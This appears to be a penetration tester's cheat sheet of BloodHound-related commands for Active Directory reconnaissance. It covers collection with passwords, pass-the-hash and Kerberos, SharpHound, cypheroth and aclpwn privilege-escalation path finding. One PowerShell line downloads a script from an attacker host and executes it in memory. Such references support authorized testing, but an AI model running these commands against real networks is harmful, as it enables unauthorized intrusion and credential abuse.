# bloodhound

% bloodhound, Active directory enumeration

## start neo4j server
#plateform/linux #target/serve #cat/UTILS
https://neo4j.com/docs/

```bash
sudo systemctl start neo4j
```

## bloodhound start IHM
#plateform/linux #target/local #cat/RECON
https://github.com/BloodHoundAD/BloodHound

```bash
bloodhound
```

## bloodhound - collect data (proxychains)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -c <method|DCOnly> --auth-method <method|ntlm> --dns-tcp -ns <dc_ip> -dc <dc_name> -v
```

## bloodhound - collect data (pth) (proxychains)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py
requiere both lm_hash and nt_hash
```bash
bloodhound-python -d <domain> -u <user> --hashes <lm_hash>:<nt_hash> -c <method|DCOnly> --auth-method <method|ntlm> --dns-tcp -ns <dc_ip> -dc <dc_name> -v
```

## bloodhound - collect data forest (pth) (proxychains)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py
requiere both lm_hash and nt_hash
```bash
bloodhound-python -d <target_domain> -u <user>@<domain> --hashes <lm_hash>:<nt_hash> -c <method|DCOnly> --auth-method <method|ntlm> --dns-tcp -ns <target_domain_ip>  -v
```

## bloodhound - collect data
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -c <method|DCOnly>
```

## bloodhound - collect data (kerberos)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py
add the DNS to /etc/hosts 

```bash
bloodhound-python -d <domain> -u <user> -p <password> -c <method|DCOnly> -ns <ip> --kerberos
```

## bloodhound - collect data (dns)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -ns <ip> -d <domain> -u <user> -p <password> -c <method|DCOnly>
```

## bloodhound - collect data (alternative)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c <method|DCOnly>
```

## sharphound - collect bloodhound data
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

```powershell
import-module sharphound.ps1
invoke-bloodhound -collectionmethod <method|DCOnly> -domain <domain>
```

## sharphound - collect bloodhound data download and execute
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
```

## cypheroth - start
#plateform/linux #target/local #cat/RECON 
Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.

https://github.com/seajaysec/cypheroth

```bash
cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
```

## aclpwn - from computer to domain - dry run
#plateform/linux #target/local #cat/RECON 
Aclpwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths.

https://github.com/fox-it/aclpwn.py

```
aclpwn -f <computer_name> -ft computer -d <domain> -dry
```



